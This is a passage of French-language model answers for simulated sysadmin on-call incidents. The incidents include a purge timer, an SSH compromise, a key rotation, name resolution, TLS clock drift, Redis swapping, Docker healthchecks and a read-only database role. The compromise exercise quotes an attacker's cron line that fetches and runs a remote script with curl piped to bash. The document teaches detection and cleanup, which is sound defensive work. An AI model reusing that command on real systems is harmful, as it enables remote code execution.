done < <(find "$DIR" -type f -name '*.csv' ! -name '*-legal.csv' \
           -not -path "$DIR/archives-legales/*" -mtime +"$AGE" -print0)
EOF
sudo chmod +x /usr/local/sbin/factura-purge-exports
```

```ini
# /etc/systemd/system/factura-purge.service
[Unit]
Description=Purge des exports CSV Factura (>30 j)
[Service]
Type=oneshot
ExecStart=/usr/local/sbin/factura-purge-exports
```

```ini
# /etc/systemd/system/factura-purge.timer
[Unit]
Description=Purge hebdomadaire des exports (dimanche 03:00)
[Timer]
OnCalendar=Sun *-*-* 03:00:00
Persistent=true
[Install]
WantedBy=timers.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now factura-purge.timer
sudo /usr/local/sbin/factura-purge-exports --dry-run   # on vérifie d'abord
sudo systemctl start factura-purge.service             # exécution réelle
journalctl -u factura-purge.service -n 20 --no-pager    # traces
```

> [!NOTE]
> **Pourquoi**
>
> Trois protections rendent une purge sûre : (1) filtrer **positivement**
> (`-name '*.csv'`) plutôt que « tout sauf » — on ne supprime que ce qu'on a
> explicitement ciblé ; (2) exclure les cas protégés (`! -name '*-legal.csv'`,
> `-not -path ".. ./archives-legales/*"`) ; (3) un `--dry-run` qui montre ce qui
> serait supprimé avant de le faire, et une **journalisation** de chaque
> suppression (systemd la capture dans le journal). `find -print0` + `read -d ''`
> gère les espaces/retours dans les noms. `OnCalendar=Sun` cible le dimanche ;
> `Persistent=true` rattrape une exécution manquée si la VM était éteinte.

> [!WARNING]
> **Piège**
>
> `find ... -delete` sans filtre positif, ou `rm -rf $DIR/*` : un jour un fichier
> légal au mauvais endroit disparaît. Autre piège : un cron `@weekly` opaque au
> lieu d'un timer systemd — pas de journal exploitable, pas de `Persistent`. Et
> tester directement en réel sans `--dry-run` : sur une purge, la première
> exécution doit être une simulation.

**Ce qu'il fallait écrire dans le ticket :** « Purge exports CSV >30 j via
`factura-purge.timer` (dimanche 03:00, `Persistent`). Script filtrant `*.csv`
uniquement, épargnant `*-legal.csv` et `archives-legales/`, avec `--dry-run` et
journalisation systemd. Dry-run validé avant la 1re exécution réelle. »

---

## C.3 Mercredi

### <a id="pc-3-1"></a>[PC.3.1](README.md#pc-3-1) — Compte deploy compromis

*Alerte SIEM : connexion SSH réussie après échecs, sur `deploy`, depuis une IP
externe. Collecter avant de nettoyer ; ne pas casser la CI.*

**Diagnostic (préserver d'abord les preuves).** Avant toute modification, on
fige l'état dans un répertoire daté :

```bash
P=~/astreinte/preuves/PC-3-1-$(date +%Y%m%d-%H%M%S); mkdir -p "$P"
sudo cp /var/log/auth.log "$P/"
sudo crontab -u deploy -l > "$P/deploy.crontab" 2>/dev/null || true
sudo cp /home/deploy/.ssh/authorized_keys "$P/authorized_keys"
last -a > "$P/last.txt"; sudo ss -tanp > "$P/ss.txt"
```

On lit ensuite la trace dans `auth.log` :

```bash
sudo grep -E 'deploy' /var/log/auth.log | grep -Ei 'failed|accepted'
# ... Failed password for deploy from 198.51.100.7 ...
# ... Failed password for deploy from 198.51.100.7 ...
# ... Accepted password for deploy from 198.51.100.7 ...  <- réussite
```

Une réussite **par mot de passe** depuis une IP externe, juste après des échecs : la compromission est quasi certaine. On cherche
ce que l'intrus a laissé :

```bash
sudo crontab -u deploy -l
# */5 * * * * curl -s http://198.51.100.7/x.sh | bash   <- persistance
sudo grep -n 'attaquant@inconnu' /home/deploy/.ssh/authorized_keys
# clé publique étrangère ajoutée                          <- porte dérobée
```

Et on comprend **comment** c'était possible :

```bash
sudo grep -rniE 'PasswordAuthentication' /etc/ssh/sshd_config \
  /etc/ssh/sshd_config.d/
# 05-migration.conf:1:PasswordAuthentication yes   <- laissé « le temps de… »
sudo passwd -S deploy
# deploy P ...    <- mot de passe actif (deploy2024, faible)
```

**Cause racine.** L'authentification SSH par mot de passe avait été réactivée
« le temps de la migration » et jamais retirée, sur un compte au mot de passe
faible : la porte était ouverte. Une fois entré, l'attaquant a posé une clé
publique (accès persistant) et une tâche cron (téléchargement/exécution).

**Correctif : contenir, puis remédier.**

```bash
# 1. couper l'accès persistant
sudo sed -i '/attaquant@inconnu/d' /home/deploy/.ssh/authorized_keys
sudo crontab -u deploy -r          # supprime le cron malveillant
# 2. verrouiller le compte et couper l'auth par mot de passe
sudo passwd -l deploy
sudo rm /etc/ssh/sshd_config.d/05-migration.conf
# retirer le « yes » ne suffit pas : le défaut d'OpenSSH est « yes »
echo 'PasswordAuthentication no' \
  | sudo tee /etc/ssh/sshd_config.d/00-durcissement.conf
sudo sshd -t && sudo systemctl reload ssh
sudo sshd -T | grep -i '^passwordauthentication'    # no
# 3. vérifier qu'on n'a pas cassé la CI (clé légitime préservée)
sudo grep -c 'ci-factura@lab-ops' /home/deploy/.ssh/authorized_keys   # 1
sudo factura-deploy && echo "CI OK"   # clé CI lisible par root seulement
```

**Prévention.** `PasswordAuthentication no` explicite et global (les changements temporaires
se tracent et s'expirent), rotation des secrets exposés (le mot de passe DB est
dans `api.env` sur cette VM : le considérer comme compromis et le changer),
alerte SIEM sur « Accepted password » (qui ne devrait jamais arriver si l'auth
par mot de passe est off), et fail2ban.

> [!NOTE]
> **Pourquoi**
>
> Une compromission se lit dans l'ordre : **entrée** (comment), **persistance**
> (ce qui a été laissé pour revenir), **actions** (ce qui a été fait). `auth.log`
> donne l'entrée (`Accepted password` = par mot de passe, l'IP, l'heure) ; la
> persistance se cache dans `authorized_keys` (clé ajoutée) et les mécanismes
> d'exécution (`crontab`, unités systemd, `~/.bashrc`). On **collecte avant de
> nettoyer** parce que supprimer la clé et le cron détruit la seule trace qui
> permet de dater et de comprendre l'étendue. Verrouiller le compte (`passwd -l`)
> et couper l'auth par mot de passe ferment la porte sans attendre l'analyse
> complète.

> [!WARNING]
> **Piège**
>
> Le réflexe « je supprime la clé et le cron, c'est réglé » sans copier `auth.log`
> d'abord : tu perds la chronologie et tu ne sauras jamais si l'attaquant a fait
> autre chose (autre compte, autre machine). Autre piège : supprimer **toutes** les
> clés de `authorized_keys`, y compris celle de la CI — tu casses le déploiement
> (le `check` le vérifie). Enfin, oublier que le secret DB présent dans `api.env`
> sur la VM doit être considéré comme lu par l'attaquant : le rétablissement inclut
> sa rotation.

**Ce qu'il fallait écrire dans le ticket :** « Compromission `deploy` confirmée :
entrée par mot de passe (198.51.100.7) rendue possible par `PasswordAuthentication
yes` laissé après migration + mot de passe faible. Persistance : clé publique
étrangère + cron `*/5` (curl|bash). Preuves figées (auth.log, crontab,
authorized_keys) avant nettoyage. Contenu : clé retirée, cron purgé, compte
verrouillé, auth mot de passe coupée, clé CI préservée (déploiement OK).
Prévention : PasswordAuthentication no + rotation du secret DB + alerte SIEM +
fail2ban. »

---

### <a id="pc-3-2"></a>[PC.3.2](README.md#pc-3-2) — Clé SSH révoquée bloque le déploiement

*Le déploiement échoue en `Permission denied (publickey)` après une rotation de
clés. Interdit : réactiver l'auth par mot de passe.*

**Diagnostic.** On reproduit avec la clé exacte qu'utilise la CI, en mode
verbeux :

```bash
sudo factura-deploy        # la clé de la CI (0700 root) exige sudo
# deploy@127.0.0.1: Permission denied (publickey).
sudo ssh -i /var/lib/factura-ci/id_ed25519 -v deploy@127.0.0.1 true 2>&1 \
  | grep -Ei 'offer|denied|Authenticating'
# Offering public key: /var/lib/factura-ci/id_ed25519
# ... Permission denied
```

La clé privée présentée est `id_ed25519`. Sa clé publique est-elle autorisée ?

```bash
sudo ssh-keygen -y -f /var/lib/factura-ci/id_ed25519 | cut -d' ' -f2 \
  > /tmp/pub-ci
sudo grep -Ff /tmp/pub-ci /home/deploy/.ssh/authorized_keys && echo présente \
  || echo ABSENTE
# ABSENTE
```

La clé publique correspondant à la clé privée de la CI **n'est plus** dans
`authorized_keys`. On regarde ce qui y est :

```bash
sudo cat /home/deploy/.ssh/authorized_keys
# ssh-ed25519 AAAA... ci-factura-2026@lab-ops   <- nouvelle clé, dont
#                                                  personne n'a la privée
```

**Cause racine.** Une rotation de clé faite à moitié : la **nouvelle** clé
publique a été installée sur `deploy`, l'**ancienne** a été retirée, mais la CI
utilise toujours l'**ancienne** clé privée (la nouvelle privée n'a pas été
déployée sur lab-ops). L'API n'est plus déployable.

**Correctif (par clé, sans mot de passe).** Terminer la rotation proprement.
Deux options ; la plus sûre est de régénérer une paire et de la mettre des deux
côtés :

```bash
# 1. retirer la clé orpheline (personne n'a sa privée) AVANT d'ajouter la
#    nouvelle, qui portera le même commentaire
sudo sed -i '/ci-factura-2026@lab-ops/d' /home/deploy/.ssh/authorized_keys
# 2. régénérer la paire de service et installer la publique côté deploy
sudo ssh-keygen -t ed25519 -N '' -C 'ci-factura-2026@lab-ops' \
  -f /var/lib/factura-ci/id_ed25519 <<<y
sudo tee -a /home/deploy/.ssh/authorized_keys >/dev/null < \
  /var/lib/factura-ci/id_ed25519.pub
sudo factura-deploy && echo "déploiement rétabli"
```

**Prévention.** Une rotation de clé se fait **add-then-remove** : on ajoute la
nouvelle clé publique **et** on déploie la nouvelle privée sur le client, on
vérifie que ça marche, **puis** seulement on retire l'ancienne. Jamais l'inverse.

> [!NOTE]
> **Pourquoi**
>
> `Permission denied (publickey)` signifie que le serveur n'a accepté aucune des
> clés offertes : soit le client ne présente pas la bonne clé privée, soit la clé
> publique correspondante n'est pas (ou plus) dans `authorized_keys`. Le
> diagnostic tient en une comparaison : `ssh-keygen -y -f <privée>` recalcule la
> publique à partir de la privée, et on cherche cette chaîne dans
> `authorized_keys`. L'ordre d'une rotation est ce qui fait tout : retirer
> l'ancienne clé avant que le client n'ait la nouvelle privée coupe l'accès. C'est
> la version SSH du « on ne débranche pas l'ancien système avant que le nouveau
> tourne ».

> [!WARNING]
> **Piège**
>
> Réactiver `PasswordAuthentication yes` pour « débloquer vite » : interdit, et
> c'est exactement la faute qui a mené à PC.3.1. Autre piège : ajouter encore une
> clé sans retirer la clé orpheline `ci-factura-2026` dont personne n'a la
> privée — ça marche, mais tu laisses une clé publique inutile dans
> `authorized_keys`, dette et confusion pour le prochain.

**Ce qu'il fallait écrire dans le ticket :** « Déploiement KO :
`Permission denied (publickey)`. Rotation de clé CI faite à moitié (nouvelle
publique installée, ancienne retirée, mais CI utilise encore l'ancienne
privée). Régénéré la paire de service et installé la publique sur `deploy`,
retiré les clés orphelines. `factura-deploy` OK. Auth par clé uniquement (pas de
mot de passe). Prévention : rotation add-then-remove documentée. »

---

### <a id="pc-3-3"></a>[PC.3.3](README.md#pc-3-3) — Résolution interne cassée

*`/sante` renvoie 503, `could not translate host name "lab-db"`. La base répond
par IP. Interdit : IP en dur dans `api.env`.*

**Diagnostic.** On lit l'erreur exacte via `/sante`, qui teste la résolution :

```bash
curl -s http://127.0.0.1:8081/sante | tr ',' '\n'
# "db_resolution": "echec: could not translate host name \"lab-db\"..."
```

On teste la résolution nous-mêmes :

```bash
getent hosts lab-db          # (rien) -> ne résout pas
getent hosts lab-db.lab.local
ping -c1 10.10.10.12 && echo "l'hôte répond par IP"   # oui
```

La base est joignable par IP, donc c'est bien un problème de **résolution de
nom**, pas de réseau ni de base. Où lab-db devrait-il être résolu ?

```bash
grep -n lab-db /etc/hosts        # (rien) -> l'entrée a disparu
sudo tail -3 /var/log/apt/history.log   # ou qui a édité /etc/hosts récemment
ls -l /etc/hosts                 # mtime récent
```

**Cause racine.** Un « nettoyage » de `/etc/hosts` a retiré la ligne
`10.10.10.12 lab-db`. L'API résout sa base par nom (bonne pratique), la
résolution échoue, `/sante` bascule en 503.

**Correctif (au bon endroit : la résolution).**

```bash
echo '10.10.10.12 lab-db' | sudo tee -a /etc/hosts
getent hosts lab-db          # 10.10.10.12 lab-db
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/sante   # 200
```

Pas besoin de redémarrer l'API : la résolution se refait à chaque appel. Un
`systemctl reload`/restart n'est nécessaire que si l'appli met en cache la
résolution (ce n'est pas le cas ici).

**Prévention.** Mettre `/etc/hosts` sous gestion (Ansible, git) pour qu'un
nettoyage manuel soit détecté et rétabli, ou basculer vers un vrai DNS interne
(le module 13 monte un DNS BIND/Unbound) avec supervision de la résolution.

> [!NOTE]
> **Pourquoi**
>
> `could not translate host name` est une erreur de **résolution** (`getaddrinfo`
> / `gaierror`), pas de connexion : le client n'a même pas essayé de joindre la
> base, il ne sait pas quelle IP viser. C'est pour ça que « ça marche par IP » et
> « ça ne marche pas par nom » coexistent. La chaîne de résolution suit
> `/etc/nsswitch.conf` (`files dns` : d'abord `/etc/hosts`, puis DNS). Retirer la
> ligne de `/etc/hosts` sans qu'un DNS ne prenne le relais casse tout. Corriger
> **la résolution** (et non coder l'IP dans l'appli) garde une seule source de
> vérité pour l'adressage.

> [!WARNING]
> **Piège**
>
> Mettre `DB_HOST=10.10.10.12` dans `api.env` « pour contourner » : interdit, et
> c'est une dette. Le jour où lab-db change d'IP, tu as des IP en dur éparpillées
> dans les confs. La résolution de noms existe précisément pour éviter ça. Autre
> piège : conclure « la base est tombée » sans tester la résolution — on répare la
> base pendant une heure alors que le problème est une ligne de `/etc/hosts`.

**Ce qu'il fallait écrire dans le ticket :** « `/sante` 503 :
`could not translate host name lab-db`. Base joignable par IP ⇒ panne de
résolution. Entrée `10.10.10.12 lab-db` disparue de `/etc/hosts` (nettoyage
manuel). Rétablie ⇒ /sante 200, pas de restart, pas d'IP en dur. Prévention :
/etc/hosts sous gestion ou DNS interne + supervision résolution. »

---

### <a id="pc-3-4"></a>[PC.3.4](README.md#pc-3-4) — Message de statut (corrigé modèle)

*Trois messages de la cadence 15 min, public non technique, incident PC.3.3.*

**T+0 — 14:00**

> **Objet : Accès au portail Factura perturbé — nous intervenons**
> Bonjour, depuis environ 12:00, le portail de facturation affiche par moments
> le message « base de données injoignable » et certaines pages ne se chargent
> pas. Nos équipes ont pris le sujet en charge et travaillent activement à le
> résoudre. Vos données ne sont pas affectées : il s'agit d'un problème d'accès,
> pas de perte. En attendant, évitez de renvoyer plusieurs fois le même
> formulaire. Prochain point à 14:15.

**T+15 — 14:15**

> Mise à jour : nous avons localisé l'origine du problème sur notre annuaire
> interne, qui empêche l'application de retrouver sa base de données. La
> correction est en cours de déploiement et de vérification. Aucune action de
> votre part n'est nécessaire. Prochain point à 14:30.

**T+30 — 14:30**

> Rétabli : le portail Factura fonctionne de nouveau normalement depuis 14:27.
> Si une page reste affichée en erreur, actualisez-la (F5). Merci de votre
> patience. Nous menons une analyse pour éviter que cela se reproduise et
> reviendrons vers vous si une action est requise de votre côté.

> [!NOTE]
> **Pourquoi**
>
> Un bon message de statut répond à trois questions que se pose l'utilisateur :
> **suis-je concerné ?** (ce qui est touché, ce qui marche), **que dois-je
> faire ?** (une action claire, ou « rien »), **quand aurai-je des nouvelles ?**
> (une heure, tenue). On traduit le jargon (« résolution DNS » → « annuaire
> interne »), on rassure sur les données sans mentir, et on ne promet **jamais**
> un délai de rétablissement chiffré tant qu'on n'a pas la cause : promettre « dans
> 10 minutes » et rater crée un second incident, de confiance.

> [!WARNING]
> **Piège**
>
> Écrire « le serveur DNS ne résout plus lab-db » à des clients : incompréhensible
> et anxiogène. Donner une heure de rétablissement à T+0 (« réglé avant 14h30 »)
> alors qu'on ne sait pas encore : si on rate, on a menti. Accuser (« erreur d'un
> prestataire ») : hors sujet et contre-productif. Se taire jusqu'à la résolution :
> le silence est pire que la panne pour la confiance.

---

## C.4 Jeudi

### <a id="pc-4-1"></a>[PC.4.1](README.md#pc-4-1) — Ouverture de port pour un partenaire

*Ouvrir `9443/tcp` de lab-web au seul partenaire `203.0.113.42`, sans rien
ouvrir d'autre.*

**Correctif (moindre privilège).** On vérifie d'abord que le service écoute,
puis on ouvre **strictement** :

```bash
sudo ss -tlnp 'sport = :9443'          # le service partenaire écoute
sudo ufw allow from 203.0.113.42 to any port 9443 proto tcp
sudo ufw status verbose | grep 9443
# 9443/tcp   ALLOW IN   203.0.113.42
```

Test depuis l'IP autorisée (et vérification que le reste n'a pas bougé) :

```bash
sudo ufw status numbered      # 22, 80, 443 toujours là, rien d'autre en 9443
```

> [!NOTE]
> **Pourquoi**
>
> `ufw allow from <IP> to any port 9443 proto tcp` crée une règle **restreinte à
> la source** : seul `203.0.113.42` peut atteindre le port. C'est le moindre
> privilège appliqué au réseau — on ouvre le strict nécessaire, à qui de droit, sur
> le bon protocole. À l'inverse, `ufw allow 9443/tcp` ouvre à **tout Internet**
> (`Anywhere`), ce qui exposerait l'endpoint de collecte à n'importe qui. Une
> demande d'ouverture de port se traite comme une demande de privilège : qui, vers
> quoi, pourquoi, pour combien de temps.

> [!WARNING]
> **Piège**
>
> `ufw allow 9443` (sans source, sans proto) : ouvert à tous, en TCP **et** UDP.
> C'est la faute typique « ça marche pour le partenaire » qui laisse une porte
> béante. Autre piège : ouvrir sans avoir vérifié que le service écoute (`ss`) —
> tu ouvres un port sur rien, le partenaire aura un `Connection refused` et tu
> croiras à un problème de pare-feu. Enfin : ne pas noter la date de fin / la
> justification, alors qu'un accès partenaire doit être revu.

**Ce qu'il fallait écrire dans le ticket :** « Ouverture `9443/tcp` sur lab-web
restreinte à la source `203.0.113.42` (Comptaflux) via ufw. Services 22/80/443
inchangés. Service de collecte confirmé en écoute. Justification métier :
contrat Comptaflux. À revoir/retirer en fin de contrat. »

---

### <a id="pc-4-2"></a>[PC.4.2](README.md#pc-4-2) — Horloge dérivée casse TLS

*TLS échoue depuis lab-web (`certificate`* `is not yet valid`*), horodatages en retard; certificats non touchés à la main. Interdit : régénérer les certificats, reboot.*

**Diagnostic.** On compare l'heure de la machine à l'heure réelle et l'état de
la synchro :

```bash
timedatectl
#  Local time: ... (en retard d'environ 3 h)
#  NTP service: inactive          <- synchro coupée
#  System clock synchronized: no
date -u                            # comparer à une source fiable (téléphone)
```

On relie à l'erreur TLS : un certificat a `notBefore`/`notAfter` ; une horloge
locale en **retard** voit un
certificat fraîchement émis comme **pas encore valide** (une horloge en avance, elle, verrait expirer trop tôt un certificat proche de son échéance) :

```bash
openssl x509 -in /etc/ssl/factura/factura.lab.local.crt -noout -dates
# notBefore=<cette nuit, heure réelle>   <- renouvellement automatique
date -u                                  # ... 3 h AVANT ce notBefore
# le certificat est bon ; c'est l'HORLOGE de lab-web qui est fausse
```

**Cause racine.** La synchronisation du temps (NTP/timesyncd) a été désactivée
et l'horloge de lab-web a pris trois heures de retard. Le renouvellement automatique de la nuit a produit un certificat parfaitement valide, mais dont le `notBefore` est encore « dans le futur » pour lab-web : tout client qui tourne sur lab-web (curl,
l'API, les
jobs) le refuse. Aucun certificat n'est en cause.

**Correctif (sans toucher aux certificats, sans reboot).**

```bash
sudo timedatectl set-ntp true
sudo systemctl enable --now systemd-timesyncd
timedatectl        # NTP service: active ; System clock synchronized: yes
# vérif TLS bout en bout
curl -s -o /dev/null -w '%{http_code}\n' \
  --resolve factura.lab.local:443:127.0.0.1 https://factura.lab.local/version
# 200
```

**Prévention.** S'assurer que le service de synchro est **activé au boot** (pour
que la dérive ne revienne pas), et superviser l'écart d'horloge (alerte si
`|offset| > 1 s`). Sur un parc, un serveur de temps interne évite de dépendre du
réseau externe.

> [!NOTE]
> **Pourquoi**
>
> Toute la cryptographie basée sur le temps (validité des certificats, jetons,
> Kerberos, TOTP) suppose des horloges **proches**. La poignée de main TLS vérifie
> `notBefore <= maintenant <= notAfter`, sans aucune tolérance côté OpenSSL : une horloge en retard de 3 h rejette tout certificat émis depuis moins de 3 h (« not yet valid »), une horloge en avance fait tomber un certificat juste avant son expiration. Seuls les clients **dont l'horloge est fausse** échouent — les postes à l'heure acceptent le même certificat — d'où un symptôme qui semble intermittent vu de l'équipe. `timedatectl`
> donne d'un coup l'heure, l'état NTP et la synchro — c'est le premier réflexe dès
> qu'on voit des horodatages incohérents.

> [!WARNING]
> **Piège**
>
> Régénérer les certificats parce que l'erreur parle de certificat : interdit, et
> inutile — les certificats sont bons, c'est l'horloge qui ment. Tu aurais changé
> des certificats sains et laissé la vraie cause (la dérive reviendra). Autre
> piège : `date -s` à la main sans réactiver NTP — tu recales une fois, l'horloge
> redérive. Toujours réactiver la synchro **et** l'activer au boot.

**Ce qu'il fallait écrire dans le ticket :** « TLS `not yet valid` depuis lab-web + horodatages en retard = horloge dérivée (−3 h), synchro NTP
désactivée; le certificat renouvelé cette nuit n'était pas encore valide pour cette horloge. Certificats sains (non touchés). `timedatectl set-ntp true` +
timesyncd activé au boot ⇒ horloge synchro, TLS 200. Prévention : supervision
de l'offset + serveur de temps interne. Aucun reboot. »

---

### <a id="pc-4-3"></a>[PC.4.3](README.md#pc-4-3) — Redis qui swappe

*lab-db swappe (si/so actifs), Redis lent, `used_memory` énorme. Interdit :
reboot, `FLUSHALL` à l'aveugle.*

**Diagnostic.** On confirme le swap **actif** (pas juste utilisé) :

```bash
vmstat 1 3
#  r  b  swpd   free ...  si   so ...
#           ...          412  980         <- si/so non nuls : thrash
```

On mesure Redis :

```bash
REDIS_PASS=$(sudo awk '/^requirepass/ {print $2}' /etc/redis/redis.conf)
redis-cli -a "$REDIS_PASS" --no-auth-warning info memory | \
  grep -E 'used_memory:|used_memory_human|maxmemory_human|maxmemory_policy'
# used_memory_human:392.10M
# maxmemory_human:0B                 <- aucune limite
# maxmemory_policy:noeviction        <- n'évince rien
redis-cli -a "$REDIS_PASS" --no-auth-warning dbsize
```

**Cause racine.** Redis n'a **aucune limite mémoire** (`maxmemory 0`) et une
politique `noeviction` : il grossit tant qu'il y a des écritures, dépasse la RAM
disponible, et pousse la VM en swap. Le swap **en mouvement** ralentit tout, y
compris Redis lui-même.

**Correctif (sans reboot, sans FLUSHALL).** Poser une limite adaptée et une
éviction, à chaud puis dans le fichier :

```bash
# à chaud (effet immédiat, sans perdre les données actives)
redis-cli -a "$REDIS_PASS" --no-auth-warning config set maxmemory 256mb
redis-cli -a "$REDIS_PASS" --no-auth-warning config set \
  maxmemory-policy allkeys-lru
# persister pour survivre au redémarrage
sudo sed -i 's/^maxmemory .*/maxmemory 256mb/' /etc/redis/redis.conf
sudo sed -i 's/^maxmemory-policy .*/maxmemory-policy allkeys-lru/' \
  /etc/redis/redis.conf
```

Vérification que le swap se calme :

```bash
vmstat 1 3        # si/so retombent à 0
```

**Prévention.** `maxmemory` toujours défini (proportion de la RAM), politique
d'éviction cohérente avec l'usage (cache → `allkeys-lru` ; file/persistance →
choisir en connaissance de cause), et alerte sur `used_memory / maxmemory > 80 %`
et sur le swap actif.

> [!NOTE]
> **Pourquoi**
>
> `maxmemory 0` veut dire « pas de limite » : Redis, qui vit en mémoire,
> consomme alors sans borne jusqu'à épuiser la RAM. Sous pression, le noyau pagine
> vers le swap ; comme Redis accède à ses données en permanence, ces pages sont
> constamment relues (`si`) et réécrites (`so`) — c'est le **thrash**, et un accès
> mémoire qui devait coûter des nanosecondes coûte des millisecondes (disque). La
> politique d'éviction décide quoi faire quand `maxmemory` est atteint :
> `noeviction` fait **échouer les écritures** (mauvais pour un cache),
> `allkeys-lru` supprime les clés les moins récemment utilisées (comportement de
> cache attendu). Le distinguo du module 19 s'applique : du swap **utilisé** n'est
> pas un problème, du swap **en mouvement** en est un.

> [!WARNING]
> **Piège**
>
> `FLUSHALL` pour « libérer » : interdit, tu détruis toutes les sessions actives
> et provoques une tempête de reconnexions/recalculs. `config set` seul sans
> éditer `redis.conf` : le réglage se perd au prochain redémarrage et la panne
> revient. Choisir `noeviction` avec une `maxmemory` : les écritures commencent à
> échouer, tu déplaces le symptôme. Et lire `used_memory` sans regarder si le swap
> **bouge** : du swap utilisé ne prouve rien.

**Ce qu'il fallait écrire dans le ticket :** « lab-db en thrash (vmstat si/so
actifs) : Redis sans `maxmemory` (0) et `noeviction` a saturé la RAM.
`maxmemory 256mb` + `allkeys-lru` posés à chaud puis persistés dans redis.conf.
Swap retombé à 0. Prévention : maxmemory systématique + alerte used_memory/swap.
Aucun reboot, aucun FLUSHALL. »

---

### <a id="pc-4-4"></a>[PC.4.4](README.md#pc-4-4) — Healthcheck de conteneur trop strict

*factura-worker clignote (starting/unhealthy), ne traite plus rien ; sonde
resserrée la veille. Interdit : supprimer le healthcheck, reboot.*

**Diagnostic.** On lit l'état de santé et l'historique du healthcheck :

```bash
docker ps --format '{{.Names}}\t{{.Status}}'
# factura-worker   Up 12 seconds (unhealthy)
docker inspect --format '{{json .State.Health}}' factura-worker | \
  python3 -m json.tool | head -20
# "Status": "unhealthy",
# "Log": [ { "ExitCode": -1,
#            "Output": "Health check exceeded timeout (1s)" } ... ]
#                                  <- timeout, pas un échec réel de la sonde
docker inspect -f '{{.State.StartedAt}}' factura-worker   # il y a < 1 min
journalctl -u factura-autoheal.service -n 5 --no-pager
# conteneur factura-worker unhealthy : redémarrage   <- en boucle
```

On regarde les paramètres appliqués :

```bash
grep -E '^HC_' /etc/factura/worker.env
# HC_INTERVAL=5s HC_TIMEOUT=1s HC_RETRIES=1 HC_START=1s
# la sonde met ~1,5 s à répondre :
time docker exec factura-worker sh /app/health.sh   # real ~1.5s
```

**Cause racine.** La sonde de santé prend ~1,5 s, mais `--health-timeout` a été
mis à **1 s** avec **une seule** tentative (`--health-retries 1`) et une période
de démarrage d'1 s. Chaque contrôle expire avant que la sonde réponde → le
conteneur est déclaré `unhealthy` → l'autoheal le redémarre → il ne finit jamais
de démarrer. Le conteneur va **parfaitement bien** ; c'est le healthcheck qui est
mal réglé.

**Correctif (détendre au bon endroit, garder une vraie sonde).**

```bash
sudo tee /etc/factura/worker.env >/dev/null <<'EOF'
HC_INTERVAL=10s
HC_TIMEOUT=5s
HC_RETRIES=3
HC_START=15s
EOF
sudo systemctl restart factura-worker.service
sleep 20
docker inspect -f '{{.State.Health.Status}}' factura-worker   # healthy
docker inspect -f '{{.State.StartedAt}}' factura-worker  # ne bouge plus
```

**Prévention.** Régler `timeout` **au-dessus** du temps de réponse réel de la
sonde (avec marge), donner plusieurs `retries` pour absorber un pic isolé, et
une `start-period` cohérente avec le temps de démarrage de l'appli. Surveiller
les redémarrages (journal de l'autoheal, `StartedAt` qui rajeunit; `RestartCount` ne compte que les relances de la *restart policy* Docker, ni les `docker restart` de l'autoheal ni les recréations par systemd).

> [!NOTE]
> **Pourquoi**
>
> Un healthcheck Docker déclare `unhealthy` quand la sonde échoue `retries` fois
> d'affilée, chaque essai étant coupé à `timeout`. Si `timeout < temps de réponse`
> de la sonde, **tous** les essais expirent — le conteneur est jugé malade alors
> qu'il répond, juste un peu plus lentement que la fenêtre autorisée. La
> `start-period` existe pour ne pas compter les échecs pendant le démarrage : trop
> courte, un service lent à chauffer est tué avant d'être prêt. Un healthcheck est
> un contrat de temps : il doit refléter le comportement réel du service, pas un
> idéal. C'est le pendant conteneur de `StartLimitBurst` en systemd (module 19,
> BF19.8) : le mécanisme de redémarrage se retourne contre un service sain quand
> ses seuils sont trop serrés.

> [!WARNING]
> **Piège**
>
> Supprimer le healthcheck « puisqu'il pose problème » : interdit, tu perds la
> détection des vraies pannes et un worker mort passera inaperçu. Augmenter à
> l'aveugle `interval` sans corriger `timeout` : le conteneur reste unhealthy,
> juste moins souvent testé. Et croire que « ça redémarre donc l'appli plante » :
> ici c'est **systemd/l'autoheal** qui tue un conteneur sain à cause du seuil, pas
> l'appli qui échoue — la distinction « qui a arrêté le service » est la même
> qu'au module 19.

**Ce qu'il fallait écrire dans le ticket :** « factura-worker en boucle
unhealthy : sonde ~1,5 s mais `health-timeout=1s`, `retries=1`, `start=1s`
(resserrés la veille) ⇒ tous les contrôles expirent, autoheal redémarre en
boucle. Conteneur sain. Réglé timeout=5s, retries=3, start=15s ⇒ healthy stable.
Healthcheck conservé. Prévention : timeout > temps de sonde + alerte sur les redémarrages de l'autoheal. »

---

## C.5 Vendredi

### <a id="pc-5-1"></a>[PC.5.1](README.md#pc-5-1) — Compte lecture seule pour l'audit

*Rôle PostgreSQL lecture seule sur `factura`, 2 semaines, depuis lab-adm, moindre
privilège.*

**Correctif (changement).** Un rôle sans droits d'admin, en lecture seule,
expirant, borné en connexions :

```bash
sudo -u postgres psql <<'SQL'
CREATE ROLE revizor_ro LOGIN PASSWORD 'AudiT-Revizor-2026'
  NOSUPERUSER NOCREATEDB NOCREATEROLE
  VALID UNTIL '2026-10-03' CONNECTION LIMIT 5;
SQL
sudo -u postgres psql -d factura <<'SQL'
GRANT CONNECT ON DATABASE factura TO revizor_ro;
GRANT USAGE ON SCHEMA public TO revizor_ro;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO revizor_ro;
-- pour les tables créées après coup :
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT TO revizor_ro;
SQL
```

Restreindre l'accès réseau à lab-adm dans `pg_hba.conf`. `pg_hba` s'arrête à la **première** ligne qui correspond : la ligne
large `host all all 10.10.10.0/24` posée au setup laisserait `revizor_ro` entrer depuis n'importe quelle VM du lab. Il faut donc, **avant** elle, autoriser lab-adm **et** rejeter le reste pour ce rôle :

```bash
# /etc/postgresql/16/main/pg_hba.conf — AVANT la ligne 10.10.10.0/24
# host  factura  revizor_ro  10.10.10.10/32  scram-sha-256
# host  all      revizor_ro  0.0.0.0/0       reject
sudo -u postgres psql -c 'select pg_reload_conf();'
```

Vérification : lecture OK, écriture refusée.

```bash
PGPASSWORD='AudiT-Revizor-2026' psql -h 10.10.10.12 -U revizor_ro -d factura \
  -c 'select count(*) from factures;'          # OK
PGPASSWORD='AudiT-Revizor-2026' psql -h 10.10.10.12 -U revizor_ro -d factura \
  -c 'insert into factures(client_id,montant) values (1,1);'
# ERROR: permission denied for table factures
```

> [!NOTE]
> **Pourquoi**
>
> Le moindre privilège sur une base se compose de plusieurs couches
> indépendantes : les **attributs** du rôle (`NOSUPERUSER NOCREATEDB
> NOCREATEROLE` — un superuser ignore tous les GRANT), les **privilèges objets**
